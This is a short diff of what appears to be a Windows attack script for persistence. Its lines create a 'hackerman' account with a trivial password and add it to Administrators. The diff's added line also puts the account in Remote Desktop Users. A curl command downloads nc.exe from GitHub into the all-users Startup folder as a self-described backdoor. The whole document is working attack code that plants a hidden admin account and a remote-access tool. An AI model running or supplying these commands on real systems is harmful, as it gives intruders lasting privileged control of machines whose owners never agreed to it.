@@ -1,6 +1,7 @@
 # add malicious user
 net user hackerman "password" /add
 Add-LocalGroupMember -Group "Administrators" -Member "hackerman"
+Add-LocalGroupMember -Group "Remote Desktop Users" -Member "hackerman"
 
 # download nc backdoor to startup folder
 curl "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\nc.exe"
